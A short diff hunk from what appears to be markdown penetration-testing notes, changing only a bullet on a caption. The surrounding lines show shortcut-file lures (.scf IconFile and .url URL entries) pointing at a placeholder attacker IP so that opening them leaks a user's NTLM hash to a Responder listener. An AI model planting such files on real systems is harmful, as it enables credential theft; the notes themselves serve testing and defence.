@@ -10,7 +10,7 @@ IconFile=\\{attacker ip}\whatever.ico
 Command=ToggleDesktop
 ```
 
-_Example .url file that when clicked will send hash to attackers responder_
+* _Example .url file that when clicked will send hash to attackers responder_
 ```
 [InternetShortcut]
 URL=file://{attacker ip}/@whatever
